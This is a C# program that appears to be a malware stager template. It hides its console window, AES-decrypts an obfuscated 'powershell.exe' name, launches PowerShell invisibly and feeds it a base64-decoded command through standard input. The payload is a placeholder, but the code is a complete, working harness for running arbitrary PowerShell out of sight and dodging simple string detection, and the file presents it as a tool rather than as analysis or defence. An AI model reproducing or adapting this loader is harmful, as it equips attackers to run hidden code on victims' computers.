using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace StageMe1
{
    class Program
    {

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        private const string key = "q+MwBLBLhmaIXyLGxfCFYIDMklGrG/OLCEEfXSdl8Cc=";
        private const string iv = "tLmnewG11skaMDLH7mV4Cw==";
        static void Main(string[] args)
        {
            const int SW_HIDE = 0;
            const int SW_SHOW = 5;

            var handle = GetConsoleWindow();

            // Hide
            ShowWindow(handle, SW_HIDE);

            // Show
            // ShowWindow(handle, SW_SHOW);
            Aes aes = new Aes(key, iv);


            Process process = new Process(); // creating process
            process.StartInfo = new ProcessStartInfo() // process start info
            {
                FileName = $"{aes.DecryptFromBase64String("kyfpEEMF/OQI74y16ysQn7tuPWRhn323weSbtunLK5E= ")}", // powershell.exe
                CreateNoWindow = true,
                RedirectStandardInput = true, //  if you want the client to write in the window 
                UseShellExecute = false // do not change
            };
            process.Start();
            using (System.IO.StreamWriter standardInput = process.StandardInput)
            {
                if (standardInput.BaseStream.CanWrite)
                {
                    byte[] data = Convert.FromBase64String(("IlBvd2VyU2hlbGxFbmNvZGVkQ29tbWFuZCI=")); // powershell encoded command
                    string payload = Encoding.UTF8.GetString(data);
                    // Console.WriteLine(payload);
                    standardInput.WriteLine(payload); // execute it 
                    process.WaitForExit(); // wait for the payload to fully execute 

                }
            }


        }
    }
    class Aes
    {
        private static RijndaelManaged rijndael = new RijndaelManaged();
        private static System.Text.UnicodeEncoding unicodeEncoding = new UnicodeEncoding();

        private const int CHUNK_SIZE = 128;

        private void InitializeRijndael()
        {
            rijndael.Mode = CipherMode.CBC;
            rijndael.Padding = PaddingMode.PKCS7;
        }

        public Aes()
        {
            InitializeRijndael();

            rijndael.KeySize = CHUNK_SIZE;
            rijndael.BlockSize = CHUNK_SIZE;

            rijndael.GenerateKey();
            rijndael.GenerateIV();
        }

        public Aes(String base64key, String base64iv)
        {
            InitializeRijndael();

            rijndael.Key = Convert.FromBase64String(base64key);
            rijndael.IV = Convert.FromBase64String(base64iv);
        }

        public Aes(byte[] key, byte[] iv)
        {
            InitializeRijndael();

            rijndael.Key = key;
            rijndael.IV = iv;
        }

        public string Decrypt(byte[] cipher)
        {
            ICryptoTransform transform = rijndael.CreateDecryptor();
            byte[] decryptedValue = transform.TransformFinalBlock(cipher, 0, cipher.Length);
            return unicodeEncoding.GetString(decryptedValue);
        }

        public string DecryptFromBase64String(string base64cipher)
        {
            return Decrypt(Convert.FromBase64String(base64cipher));
        }

        public byte[] EncryptToByte(string plain)
        {
            ICryptoTransform encryptor = rijndael.CreateEncryptor();
            byte[] cipher = unicodeEncoding.GetBytes(plain);
            byte[] encryptedValue = encryptor.TransformFinalBlock(cipher, 0, cipher.Length);
            return encryptedValue;
        }

        public string EncryptToBase64String(string plain)
        {
            return Convert.ToBase64String(EncryptToByte(plain));
        }

        public string GetKey()
        {
            return Convert.ToBase64String(rijndael.Key);
        }

        public string GetIV()
        {
            return Convert.ToBase64String(rijndael.IV);
        }
    }
}
